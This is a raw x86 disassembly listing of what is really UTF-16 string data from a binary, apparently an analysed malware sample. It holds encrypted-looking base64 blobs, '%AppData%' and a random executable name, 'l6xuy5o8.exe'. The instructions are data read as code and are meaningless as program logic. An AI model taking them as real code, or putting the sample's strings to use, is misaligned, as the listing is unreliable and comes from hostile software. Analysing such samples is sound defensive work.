  409662:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  409666:	00 41 00             	add    %al,0x0(%ecx)
  409669:	52                   	push   %edx
  40966a:	00 46 00             	add    %al,0x0(%esi)
  40966d:	62 00                	bound  %eax,(%eax)
  40966f:	49                   	dec    %ecx
  409670:	00 63 00             	add    %ah,0x0(%ebx)
  409673:	6c                   	insb   (%dx),%es:(%edi)
  409674:	00 48 00             	add    %cl,0x0(%eax)
  409677:	48                   	dec    %eax
  409678:	00 34 00             	add    %dh,(%eax,%eax,1)
  40967b:	52                   	push   %edx
  40967c:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  409680:	00 52 00             	add    %dl,0x0(%edx)
  409683:	6f                   	outsl  %ds:(%esi),(%dx)
  409684:	00 57 00             	add    %dl,0x0(%edi)
  409687:	2b 00                	sub    (%eax),%eax
  409689:	52                   	push   %edx
  40968a:	00 35 00 41 00 50    	add    %dh,0x50004100
  409690:	00 7a 00             	add    %bh,0x0(%edx)
  409693:	54                   	push   %esp
  409694:	00 69 00             	add    %ch,0x0(%ecx)
  409697:	77 00                	ja     0x409699
  409699:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40969e:	81 81 32 00 63 00 6e 	addl   $0x35006e,0x630032(%ecx)
  4096a5:	00 35 00 
  4096a8:	53                   	push   %ebx
  4096a9:	00 6f 00             	add    %ch,0x0(%edi)
  4096ac:	4e                   	dec    %esi
  4096ad:	00 4b 00             	add    %cl,0x0(%ebx)
  4096b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4096b1:	00 30                	add    %dh,(%eax)
  4096b3:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  4096b7:	00 36                	add    %dh,(%esi)
  4096b9:	00 4d 00             	add    %cl,0x0(%ebp)
  4096bc:	4f                   	dec    %edi
  4096bd:	00 6d 00             	add    %ch,0x0(%ebp)
  4096c0:	39 00                	cmp    %eax,(%eax)
  4096c2:	78 00                	js     0x4096c4
  4096c4:	45                   	inc    %ebp
  4096c5:	00 4f 00             	add    %cl,0x0(%edi)
  4096c8:	35 00 57 00 62       	xor    $0x62005700,%eax
  4096cd:	00 4f 00             	add    %cl,0x0(%edi)
  4096d0:	50                   	push   %eax
  4096d1:	00 39                	add    %bh,(%ecx)
  4096d3:	00 37                	add    %dh,(%edi)
  4096d5:	00 39                	add    %bh,(%ecx)
  4096d7:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  4096db:	00 59 00             	add    %bl,0x0(%ecx)
  4096de:	46                   	inc    %esi
  4096df:	00 2b                	add    %ch,(%ebx)
  4096e1:	00 62 00             	add    %ah,0x0(%edx)
  4096e4:	39 00                	cmp    %eax,(%eax)
  4096e6:	4c                   	dec    %esp
  4096e7:	00 4f 00             	add    %cl,0x0(%edi)
  4096ea:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  4096ee:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  4096f2:	76 00                	jbe    0x4096f4
  4096f4:	66 00 47 00          	data16 add %al,0x0(%edi)
  4096f8:	6c                   	insb   (%dx),%es:(%edi)
  4096f9:	00 49 00             	add    %cl,0x0(%ecx)
  4096fc:	48                   	dec    %eax
  4096fd:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  409701:	00 6f 00             	add    %ch,0x0(%edi)
  409704:	4c                   	dec    %esp
  409705:	00 66 00             	add    %ah,0x0(%esi)
  409708:	37                   	aaa
  409709:	00 78 00             	add    %bh,0x0(%eax)
  40970c:	70 00                	jo     0x40970e
  40970e:	46                   	inc    %esi
  40970f:	00 39                	add    %bh,(%ecx)
  409711:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  409715:	00 38                	add    %bh,(%eax)
  409717:	00 7a 00             	add    %bh,0x0(%edx)
  40971a:	41                   	inc    %ecx
  40971b:	00 35 00 53 00 4a    	add    %dh,0x4a005300
  409721:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  409725:	00 6a 00             	add    %ch,0x0(%edx)
  409728:	55                   	push   %ebp
  409729:	00 56 00             	add    %dl,0x0(%esi)
  40972c:	38 00                	cmp    %al,(%eax)
  40972e:	6b 00 30             	imul   $0x30,(%eax),%eax
  409731:	00 47 00             	add    %al,0x0(%edi)
  409734:	6c                   	insb   (%dx),%es:(%edi)
  409735:	00 39                	add    %bh,(%ecx)
  409737:	00 31                	add    %dh,(%ecx)
  409739:	00 35 00 59 00 5a    	add    %dh,0x5a005900
  40973f:	00 50 00             	add    %dl,0x0(%eax)
  409742:	56                   	push   %esi
  409743:	00 4d 00             	add    %cl,0x0(%ebp)
  409746:	39 00                	cmp    %eax,(%eax)
  409748:	54                   	push   %esp
  409749:	00 62 00             	add    %ah,0x0(%edx)
  40974c:	58                   	pop    %eax
  40974d:	00 2f                	add    %ch,(%edi)
  40974f:	00 4b 00             	add    %cl,0x0(%ebx)
  409752:	2b 00                	sub    (%eax),%eax
  409754:	6e                   	outsb  %ds:(%esi),(%dx)
  409755:	00 61 00             	add    %ah,0x0(%ecx)
  409758:	73 00                	jae    0x40975a
  40975a:	78 00                	js     0x40975c
  40975c:	57                   	push   %edi
  40975d:	00 71 00             	add    %dh,0x0(%ecx)
  409760:	63 00                	arpl   %eax,(%eax)
  409762:	32 00                	xor    (%eax),%al
  409764:	6a 00                	push   $0x0
  409766:	6d                   	insl   (%dx),%es:(%edi)
  409767:	00 2b                	add    %ch,(%ebx)
  409769:	00 76 00             	add    %dh,0x0(%esi)
  40976c:	31 00                	xor    %eax,(%eax)
  40976e:	56                   	push   %esi
  40976f:	00 37                	add    %dh,(%edi)
  409771:	00 6e 00             	add    %ch,0x0(%esi)
  409774:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  409778:	67 00 44 00          	add    %al,0x0(%si)
  40977c:	4c                   	dec    %esp
  40977d:	00 79 00             	add    %bh,0x0(%ecx)
  409780:	4a                   	dec    %edx
  409781:	00 66 00             	add    %ah,0x0(%esi)
  409784:	6f                   	outsl  %ds:(%esi),(%dx)
  409785:	00 32                	add    %dh,(%edx)
  409787:	00 6d 00             	add    %ch,0x0(%ebp)
  40978a:	37                   	aaa
  40978b:	00 35 00 35 00 67    	add    %dh,0x67003500
  409791:	00 47 00             	add    %al,0x0(%edi)
  409794:	5a                   	pop    %edx
  409795:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  409799:	00 79 00             	add    %bh,0x0(%ecx)
  40979c:	57                   	push   %edi
  40979d:	00 4b 00             	add    %cl,0x0(%ebx)
  4097a0:	55                   	push   %ebp
  4097a1:	00 46 00             	add    %al,0x0(%esi)
  4097a4:	35 00 48 00 53       	xor    $0x53004800,%eax
  4097a9:	00 2f                	add    %ch,(%edi)
  4097ab:	00 6b 00             	add    %ch,0x0(%ebx)
  4097ae:	77 00                	ja     0x4097b0
  4097b0:	37                   	aaa
  4097b1:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  4097b5:	00 56 00             	add    %dl,0x0(%esi)
  4097b8:	51                   	push   %ecx
  4097b9:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  4097bd:	00 55 00             	add    %dl,0x0(%ebp)
  4097c0:	41                   	inc    %ecx
  4097c1:	00 6b 00             	add    %ch,0x0(%ebx)
  4097c4:	73 00                	jae    0x4097c6
  4097c6:	67 00 77 00          	add    %dh,0x0(%bx)
  4097ca:	2b 00                	sub    (%eax),%eax
  4097cc:	63 00                	arpl   %eax,(%eax)
  4097ce:	4f                   	dec    %edi
  4097cf:	00 34 00             	add    %dh,(%eax,%eax,1)
  4097d2:	42                   	inc    %edx
  4097d3:	00 51 00             	add    %dl,0x0(%ecx)
  4097d6:	75 00                	jne    0x4097d8
  4097d8:	30 00                	xor    %al,(%eax)
  4097da:	69 00 39 00 73 00    	imul   $0x730039,(%eax),%eax
  4097e0:	6c                   	insb   (%dx),%es:(%edi)
  4097e1:	00 45 00             	add    %al,0x0(%ebp)
  4097e4:	46                   	inc    %esi
  4097e5:	00 72 00             	add    %dh,0x0(%edx)
  4097e8:	49                   	dec    %ecx
  4097e9:	00 56 00             	add    %dl,0x0(%esi)
  4097ec:	7a 00                	jp     0x4097ee
  4097ee:	45                   	inc    %ebp
  4097ef:	00 2f                	add    %ch,(%edi)
  4097f1:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  4097f5:	00 56 00             	add    %dl,0x0(%esi)
  4097f8:	49                   	dec    %ecx
  4097f9:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  4097fd:	00 76 00             	add    %dh,0x0(%esi)
  409800:	61                   	popa
  409801:	00 6a 00             	add    %ch,0x0(%edx)
  409804:	39 00                	cmp    %eax,(%eax)
  409806:	46                   	inc    %esi
  409807:	00 66 00             	add    %ah,0x0(%esi)
  40980a:	48                   	dec    %eax
  40980b:	00 41 00             	add    %al,0x0(%ecx)
  40980e:	4e                   	dec    %esi
  40980f:	00 55 00             	add    %dl,0x0(%ebp)
  409812:	41                   	inc    %ecx
  409813:	00 4d 00             	add    %cl,0x0(%ebp)
  409816:	2b 00                	sub    (%eax),%eax
  409818:	30 00                	xor    %al,(%eax)
  40981a:	62 00                	bound  %eax,(%eax)
  40981c:	58                   	pop    %eax
  40981d:	00 4e 00             	add    %cl,0x0(%esi)
  409820:	00 80 b1 48 00 4c    	add    %al,0x4c0048b1(%eax)
  409826:	00 77 00             	add    %dh,0x0(%edi)
  409829:	34 00                	xor    $0x0,%al
  40982b:	69 00 43 00 6a 00    	imul   $0x6a0043,(%eax),%eax
  409831:	32 00                	xor    (%eax),%al
  409833:	6f                   	outsl  %ds:(%esi),(%dx)
  409834:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  409838:	00 66 00             	add    %ah,0x0(%esi)
  40983b:	33 00                	xor    (%eax),%eax
  40983d:	5a                   	pop    %edx
  40983e:	00 52 00             	add    %dl,0x0(%edx)
  409841:	59                   	pop    %ecx
  409842:	00 6a 00             	add    %ch,0x0(%edx)
  409845:	34 00                	xor    $0x0,%al
  409847:	51                   	push   %ecx
  409848:	00 68 00             	add    %ch,0x0(%eax)
  40984b:	59                   	pop    %ecx
  40984c:	00 39                	add    %bh,(%ecx)
  40984e:	00 33                	add    %dh,(%ebx)
  409850:	00 6b 00             	add    %ch,0x0(%ebx)
  409853:	42                   	inc    %edx
  409854:	00 36                	add    %dh,(%esi)
  409856:	00 45 00             	add    %al,0x0(%ebp)
  409859:	33 00                	xor    (%eax),%eax
  40985b:	34 00                	xor    $0x0,%al
  40985d:	4d                   	dec    %ebp
  40985e:	00 49 00             	add    %cl,0x0(%ecx)
  409861:	6e                   	outsb  %ds:(%esi),(%dx)
  409862:	00 47 00             	add    %al,0x0(%edi)
  409865:	41                   	inc    %ecx
  409866:	00 4f 00             	add    %cl,0x0(%edi)
  409869:	50                   	push   %eax
  40986a:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40986e:	00 58 00             	add    %bl,0x0(%eax)
  409871:	4f                   	dec    %edi
  409872:	00 68 00             	add    %ch,0x0(%eax)
  409875:	31 00                	xor    %eax,(%eax)
  409877:	74 00                	je     0x409879
  409879:	70 00                	jo     0x40987b
  40987b:	41                   	inc    %ecx
  40987c:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  409880:	00 42 00             	add    %al,0x0(%edx)
  409883:	46                   	inc    %esi
  409884:	00 48 00             	add    %cl,0x0(%eax)
  409887:	75 00                	jne    0x409889
  409889:	73 00                	jae    0x40988b
  40988b:	56                   	push   %esi
  40988c:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  409890:	00 70 00             	add    %dh,0x0(%eax)
  409893:	47                   	inc    %edi
  409894:	00 61 00             	add    %ah,0x0(%ecx)
  409897:	64 00 36             	add    %dh,%fs:(%esi)
  40989a:	00 43 00             	add    %al,0x0(%ebx)
  40989d:	56                   	push   %esi
  40989e:	00 70 00             	add    %dh,0x0(%eax)
  4098a1:	46                   	inc    %esi
  4098a2:	00 6e 00             	add    %ch,0x0(%esi)
  4098a5:	74 00                	je     0x4098a7
  4098a7:	7a 00                	jp     0x4098a9
  4098a9:	53                   	push   %ebx
  4098aa:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  4098ae:	00 56 00             	add    %dl,0x0(%esi)
  4098b1:	49                   	dec    %ecx
  4098b2:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  4098b6:	00 58 00             	add    %bl,0x0(%eax)
  4098b9:	73 00                	jae    0x4098bb
  4098bb:	38 00                	cmp    %al,(%eax)
  4098bd:	50                   	push   %eax
  4098be:	00 47 00             	add    %al,0x0(%edi)
  4098c1:	35 00 35 00 66       	xor    $0x66003500,%eax
  4098c6:	00 6b 00             	add    %ch,0x0(%ebx)
  4098c9:	6a 00                	push   $0x0
  4098cb:	31 00                	xor    %eax,(%eax)
  4098cd:	77 00                	ja     0x4098cf
  4098cf:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4098d4:	80 b1 77 00 69 00 68 	xorb   $0x68,0x690077(%ecx)
  4098db:	00 30                	add    %dh,(%eax)
  4098dd:	00 4f 00             	add    %cl,0x0(%edi)
  4098e0:	72 00                	jb     0x4098e2
  4098e2:	4f                   	dec    %edi
  4098e3:	00 76 00             	add    %dh,0x0(%esi)
  4098e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4098e7:	00 59 00             	add    %bl,0x0(%ecx)
  4098ea:	62 00                	bound  %eax,(%eax)
  4098ec:	6b 00 31             	imul   $0x31,(%eax),%eax
  4098ef:	00 37                	add    %dh,(%edi)
  4098f1:	00 6b 00             	add    %ch,0x0(%ebx)
  4098f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f5:	00 68 00             	add    %ch,0x0(%eax)
  4098f8:	72 00                	jb     0x4098fa
  4098fa:	79 00                	jns    0x4098fc
  4098fc:	35 00 61 00 4a       	xor    $0x4a006100,%eax
  409901:	00 73 00             	add    %dh,0x0(%ebx)
  409904:	59                   	pop    %ecx
  409905:	00 62 00             	add    %ah,0x0(%edx)
  409908:	55                   	push   %ebp
  409909:	00 49 00             	add    %cl,0x0(%ecx)
  40990c:	4d                   	dec    %ebp
  40990d:	00 6e 00             	add    %ch,0x0(%esi)
  409910:	47                   	inc    %edi
  409911:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  409915:	00 59 00             	add    %bl,0x0(%ecx)
  409918:	48                   	dec    %eax
  409919:	00 6b 00             	add    %ch,0x0(%ebx)
  40991c:	4f                   	dec    %edi
  40991d:	00 4e 00             	add    %cl,0x0(%esi)
  409920:	70 00                	jo     0x409922
  409922:	43                   	inc    %ebx
  409923:	00 66 00             	add    %ah,0x0(%esi)
  409926:	41                   	inc    %ecx
  409927:	00 4d 00             	add    %cl,0x0(%ebp)
  40992a:	4f                   	dec    %edi
  40992b:	00 43 00             	add    %al,0x0(%ebx)
  40992e:	75 00                	jne    0x409930
  409930:	31 00                	xor    %eax,(%eax)
  409932:	6a 00                	push   $0x0
  409934:	37                   	aaa
  409935:	00 58 00             	add    %bl,0x0(%eax)
  409938:	55                   	push   %ebp
  409939:	00 70 00             	add    %dh,0x0(%eax)
  40993c:	77 00                	ja     0x40993e
  40993e:	53                   	push   %ebx
  40993f:	00 58 00             	add    %bl,0x0(%eax)
  409942:	74 00                	je     0x409944
  409944:	59                   	pop    %ecx
  409945:	00 6e 00             	add    %ch,0x0(%esi)
  409948:	72 00                	jb     0x40994a
  40994a:	52                   	push   %edx
  40994b:	00 37                	add    %dh,(%edi)
  40994d:	00 73 00             	add    %dh,0x0(%ebx)
  409950:	4d                   	dec    %ebp
  409951:	00 33                	add    %dh,(%ebx)
  409953:	00 61 00             	add    %ah,0x0(%ecx)
  409956:	4b                   	dec    %ebx
  409957:	00 37                	add    %dh,(%edi)
  409959:	00 6d 00             	add    %ch,0x0(%ebp)
  40995c:	43                   	inc    %ebx
  40995d:	00 38                	add    %bh,(%eax)
  40995f:	00 58 00             	add    %bl,0x0(%eax)
  409962:	73 00                	jae    0x409964
  409964:	49                   	dec    %ecx
  409965:	00 65 00             	add    %ah,0x0(%ebp)
  409968:	48                   	dec    %eax
  409969:	00 67 00             	add    %ah,0x0(%edi)
  40996c:	42                   	inc    %edx
  40996d:	00 6e 00             	add    %ch,0x0(%esi)
  409970:	74 00                	je     0x409972
  409972:	77 00                	ja     0x409974
  409974:	53                   	push   %ebx
  409975:	00 49 00             	add    %cl,0x0(%ecx)
  409978:	55                   	push   %ebp
  409979:	00 36                	add    %dh,(%esi)
  40997b:	00 46 00             	add    %al,0x0(%esi)
  40997e:	4d                   	dec    %ebp
  40997f:	00 51 00             	add    %dl,0x0(%ecx)
  409982:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409987:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40998d:	00 70 00             	add    %dh,0x0(%eax)
  409990:	44                   	inc    %esp
  409991:	00 61 00             	add    %ah,0x0(%ecx)
  409994:	74 00                	je     0x409996
  409996:	61                   	popa
  409997:	00 25 00 00 19 6c    	add    %ah,0x6c190000
  40999d:	00 36                	add    %dh,(%esi)
  40999f:	00 78 00             	add    %bh,0x0(%eax)
  4099a2:	75 00                	jne    0x4099a4
  4099a4:	79 00                	jns    0x4099a6
  4099a6:	35 00 6f 00 38       	xor    $0x38006f00,%eax
  4099ab:	00 2e                	add    %ch,(%esi)
  4099ad:	00 65 00             	add    %ah,0x0(%ebp)
  4099b0:	78 00                	js     0x4099b2
  4099b2:	65 00 00             	add    %al,%gs:(%eax)
  4099b5:	59                   	pop    %ecx
  4099b6:	56                   	push   %esi
  4099b7:	00 30                	add    %dh,(%eax)
  4099b9:	00 31                	add    %dh,(%ecx)
  4099bb:	00 71 00             	add    %dh,0x0(%ecx)
  4099be:	63 00                	arpl   %eax,(%eax)
  4099c0:	31 00                	xor    %eax,(%eax)
  4099c2:	42                   	inc    %edx
  4099c3:	00 69 00             	add    %ch,0x0(%ecx)
  4099c6:	59                   	pop    %ecx
  4099c7:	00 33                	add    %dh,(%ebx)
  4099c9:	00 51 00             	add    %dl,0x0(%ecx)
  4099cc:	7a 00                	jp     0x4099ce
  4099ce:	55                   	push   %ebp
  4099cf:	00 30                	add    %dh,(%eax)
  4099d1:	00 5a 00             	add    %bl,0x0(%edx)
  4099d4:	44                   	inc    %esp
  4099d5:	00 61 00             	add    %ah,0x0(%ecx)
  4099d8:	47                   	inc    %edi
  4099d9:	00 39                	add    %bh,(%ecx)
  4099db:	00 5a 00             	add    %bl,0x0(%edx)
  4099de:	54                   	push   %esp
  4099df:	00 57 00             	add    %dl,0x0(%edi)
  4099e2:	35 00 6d 00 63       	xor    $0x63006d00,%eax
  4099e7:	00 32                	add    %dh,(%edx)
  4099e9:	00 4a 00             	add    %cl,0x0(%edx)
  4099ec:	75 00                	jne    0x4099ee
  4099ee:	5a                   	pop    %edx
  4099ef:	00 47 00             	add    %al,0x0(%edi)
  4099f2:	4a                   	dec    %edx
  4099f3:	00 77 00             	add    %dh,0x0(%edi)
  4099f6:	61                   	popa
  4099f7:	00 6b 00             	add    %ch,0x0(%ebx)
  4099fa:	4a                   	dec    %edx
  4099fb:	00 30                	add    %dh,(%eax)
  4099fd:	00 51 00             	add    %dl,0x0(%ecx)
  409a00:	30 00                	xor    %al,(%eax)
  409a02:	78 00                	js     0x409a04
  409a04:	52                   	push   %edx
  409a05:	00 61 00             	add    %ah,0x0(%ecx)
  409a08:	54                   	push   %esp
  409a09:	00 4d 00             	add    %cl,0x0(%ebp)
  409a0c:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409a11:	5a                   	pop    %edx
  409a12:	00 42 00             	add    %al,0x0(%edx)
  409a15:	43                   	inc    %ebx
  409a16:	00 6e 00             	add    %ch,0x0(%esi)
  409a19:	50                   	push   %eax
  409a1a:	00 36                	add    %dh,(%esi)
  409a1c:	00 73 00             	add    %dh,0x0(%ebx)
  409a1f:	34 00                	xor    $0x0,%al
  409a21:	4a                   	dec    %edx
  409a22:	00 5a 00             	add    %bl,0x0(%edx)
  409a25:	54                   	push   %esp
  409a26:	00 32                	add    %dh,(%edx)
  409a28:	00 69 00             	add    %ch,0x0(%ecx)
  409a2b:	67 00 2b             	add    %ch,(%bp,%di)
  409a2e:	00 69 00             	add    %ch,0x0(%ecx)
  409a31:	65 00 32             	add    %dh,%gs:(%edx)
  409a34:	00 79 00             	add    %bh,0x0(%ecx)
  409a37:	42                   	inc    %edx
  409a38:	00 73 00             	add    %dh,0x0(%ebx)
  409a3b:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409a3f:	78 00                	js     0x409a41
  409a41:	68 00 36 00 6c       	push   $0x6c003600
  409a46:	00 75 00             	add    %dh,0x0(%ebp)
  409a49:	4d                   	dec    %ebp
  409a4a:	00 39                	add    %bh,(%ecx)
  409a4c:	00 79 00             	add    %bh,0x0(%ecx)
  409a4f:	50                   	push   %eax
  409a50:	00 73 00             	add    %dh,0x0(%ebx)
  409a53:	37                   	aaa
  409a54:	00 57 00             	add    %dl,0x0(%edi)
  409a57:	6c                   	insb   (%dx),%es:(%edi)
  409a58:	00 67 00             	add    %ah,0x0(%edi)
  409a5b:	6d                   	insl   (%dx),%es:(%edi)
  409a5c:	00 6f 00             	add    %ch,0x0(%edi)
  409a5f:	46                   	inc    %esi
  409a60:	00 45 00             	add    %al,0x0(%ebp)
  409a63:	6d                   	insl   (%dx),%es:(%edi)
  409a64:	00 50 00             	add    %dl,0x0(%eax)
  409a67:	4d                   	dec    %ebp
  409a68:	00 37                	add    %dh,(%edi)
  409a6a:	00 2f                	add    %ch,(%edi)
  409a6c:	00 56 00             	add    %dl,0x0(%esi)
  409a6f:	55                   	push   %ebp
  409a70:	00 72 00             	add    %dh,0x0(%edx)
  409a73:	6c                   	insb   (%dx),%es:(%edi)
  409a74:	00 6a 00             	add    %ch,0x0(%edx)
  409a77:	32 00                	xor    (%eax),%al
  409a79:	6f                   	outsl  %ds:(%esi),(%dx)
  409a7a:	00 53 00             	add    %dl,0x0(%ebx)
  409a7d:	35 00 36 00 4a       	xor    $0x4a003600,%eax
  409a82:	00 6b 00             	add    %ch,0x0(%ebx)
  409a85:	51                   	push   %ecx
  409a86:	00 43 00             	add    %al,0x0(%ebx)
  409a89:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  409a8c:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  409a90:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  409a94:	00 6a 00             	add    %ch,0x0(%edx)
  409a97:	77 00                	ja     0x409a99
  409a99:	52                   	push   %edx
  409a9a:	00 65 00             	add    %ah,0x0(%ebp)
  409a9d:	61                   	popa
  409a9e:	00 4b 00             	add    %cl,0x0(%ebx)
  409aa1:	70 00                	jo     0x409aa3
  409aa3:	2f                   	das
  409aa4:	00 4b 00             	add    %cl,0x0(%ebx)
  409aa7:	35 00 38 00 6a       	xor    $0x6a003800,%eax
  409aac:	00 59 00             	add    %bl,0x0(%ecx)
  409aaf:	68 00 59 00 2b       	push   $0x2b005900
  409ab4:	00 71 00             	add    %dh,0x0(%ecx)
  409ab7:	57                   	push   %edi
  409ab8:	00 73 00             	add    %dh,0x0(%ebx)
  409abb:	67 00 3d             	add    %bh,(%di)
  409abe:	00 3d 00 00 92 59    	add    %bh,0x59920000
  409ac4:	42                   	inc    %edx
  409ac5:	00 45 00             	add    %al,0x0(%ebp)
  409ac8:	78 00                	js     0x409aca
  409aca:	48                   	dec    %eax
  409acb:	00 79 00             	add    %bh,0x0(%ecx)
  409ace:	4c                   	dec    %esp
  409acf:	00 63 00             	add    %ah,0x0(%ebx)
  409ad2:	78 00                	js     0x409ad4
  409ad4:	56                   	push   %esi
  409ad5:	00 52 00             	add    %dl,0x0(%edx)
  409ad8:	61                   	popa
  409ad9:	00 33                	add    %dh,(%ebx)
  409adb:	00 38                	add    %bh,(%eax)
  409add:	00 72 00             	add    %dh,0x0(%edx)
  409ae0:	30 00                	xor    %al,(%eax)
  409ae2:	70 00                	jo     0x409ae4
  409ae4:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  409ae8:	78 00                	js     0x409aea
  409aea:	75 00                	jne    0x409aec
  409aec:	43                   	inc    %ebx
  409aed:	00 67 00             	add    %ah,0x0(%edi)
  409af0:	72 00                	jb     0x409af2
  409af2:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  409af6:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  409afa:	6e                   	outsb  %ds:(%esi),(%dx)
  409afb:	00 65 00             	add    %ah,0x0(%ebp)
  409afe:	62 00                	bound  %eax,(%eax)
  409b00:	6d                   	insl   (%dx),%es:(%edi)
  409b01:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  409b05:	00 37                	add    %dh,(%edi)
  409b07:	00 78 00             	add    %bh,0x0(%eax)
  409b0a:	59                   	pop    %ecx
  409b0b:	00 6a 00             	add    %ch,0x0(%edx)
  409b0e:	62 00                	bound  %eax,(%eax)
  409b10:	43                   	inc    %ebx
  409b11:	00 7a 00             	add    %bh,0x0(%edx)
  409b14:	4f                   	dec    %edi
  409b15:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  409b19:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  409b1d:	00 6b 00             	add    %ch,0x0(%ebx)
  409b20:	4b                   	dec    %ebx
  409b21:	00 6b 00             	add    %ch,0x0(%ebx)
  409b24:	52                   	push   %edx
  409b25:	00 4b 00             	add    %cl,0x0(%ebx)
  409b28:	79 00                	jns    0x409b2a
  409b2a:	6e                   	outsb  %ds:(%esi),(%dx)
  409b2b:	00 61 00             	add    %ah,0x0(%ecx)
  409b2e:	73 00                	jae    0x409b30
  409b30:	76 00                	jbe    0x409b32
  409b32:	71 00                	jno    0x409b34
  409b34:	4f                   	dec    %edi
  409b35:	00 68 00             	add    %ch,0x0(%eax)
  409b38:	58                   	pop    %eax
  409b39:	00 71 00             	add    %dh,0x0(%ecx)
  409b3c:	46                   	inc    %esi
  409b3d:	00 67 00             	add    %ah,0x0(%edi)
  409b40:	57                   	push   %edi
  409b41:	00 6f 00             	add    %ch,0x0(%edi)
  409b44:	4c                   	dec    %esp
  409b45:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  409b49:	00 51 00             	add    %dl,0x0(%ecx)
  409b4c:	4c                   	dec    %esp
  409b4d:	00 69 00             	add    %ch,0x0(%ecx)
  409b50:	34 00                	xor    $0x0,%al
  409b52:	45                   	inc    %ebp
  409b53:	00 58 00             	add    %bl,0x0(%eax)
  409b56:	34 00                	xor    $0x0,%al
  409b58:	67 00 66 00          	add    %ah,0x0(%bp)
  409b5c:	44                   	inc    %esp
  409b5d:	00 42 00             	add    %al,0x0(%edx)
  409b60:	30 00                	xor    %al,(%eax)
  409b62:	49                   	dec    %ecx
  409b63:	00 49 00             	add    %cl,0x0(%ecx)
  409b66:	7a 00                	jp     0x409b68
  409b68:	48                   	dec    %eax
  409b69:	00 49 00             	add    %cl,0x0(%ecx)
  409b6c:	77 00                	ja     0x409b6e
  409b6e:	46                   	inc    %esi
  409b6f:	00 55 00             	add    %dl,0x0(%ebp)
  409b72:	55                   	push   %ebp
  409b73:	00 2b                	add    %ch,(%ebx)
  409b75:	00 33                	add    %dh,(%ebx)
  409b77:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b7a:	6d                   	insl   (%dx),%es:(%edi)
  409b7b:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  409b7f:	00 62 00             	add    %ah,0x0(%edx)
  409b82:	2b 00                	sub    (%eax),%eax
  409b84:	30 00                	xor    %al,(%eax)
  409b86:	36 00 39             	add    %bh,%ss:(%ecx)
  409b89:	00 75 00             	add    %dh,0x0(%ebp)
  409b8c:	75 00                	jne    0x409b8e
  409b8e:	4c                   	dec    %esp
  409b8f:	00 75 00             	add    %dh,0x0(%ebp)
  409b92:	76 00                	jbe    0x409b94
  409b94:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  409b98:	4d                   	dec    %ebp
  409b99:	00 6f 00             	add    %ch,0x0(%edi)
  409b9c:	42                   	inc    %edx
  409b9d:	00 6a 00             	add    %ch,0x0(%edx)
  409ba0:	78 00                	js     0x409ba2
  409ba2:	51                   	push   %ecx
  409ba3:	00 58 00             	add    %bl,0x0(%eax)
  409ba6:	6c                   	insb   (%dx),%es:(%edi)
  409ba7:	00 62 00             	add    %ah,0x0(%edx)
  409baa:	7a 00                	jp     0x409bac
  409bac:	54                   	push   %esp
  409bad:	00 47 00             	add    %al,0x0(%edi)
  409bb0:	73 00                	jae    0x409bb2
  409bb2:	45                   	inc    %ebp
  409bb3:	00 37                	add    %dh,(%edi)
  409bb5:	00 5a 00             	add    %bl,0x0(%edx)
  409bb8:	2f                   	das
  409bb9:	00 39                	add    %bh,(%ecx)
  409bbb:	00 56 00             	add    %dl,0x0(%esi)
  409bbe:	71 00                	jno    0x409bc0
  409bc0:	75 00                	jne    0x409bc2
  409bc2:	6e                   	outsb  %ds:(%esi),(%dx)
  409bc3:	00 59 00             	add    %bl,0x0(%ecx)
  409bc6:	43                   	inc    %ebx
  409bc7:	00 49 00             	add    %cl,0x0(%ecx)
  409bca:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  409bce:	4d                   	dec    %ebp
  409bcf:	00 37                	add    %dh,(%edi)
  409bd1:	00 35 00 79 00 50    	add    %dh,0x50007900
  409bd7:	00 39                	add    %bh,(%ecx)
  409bd9:	00 66 00             	add    %ah,0x0(%esi)
  409bdc:	35 00 75 00 6a       	xor    $0x6a007500,%eax
  409be1:	00 71 00             	add    %dh,0x0(%ecx)
  409be4:	78 00                	js     0x409be6
  409be6:	62 00                	bound  %eax,(%eax)
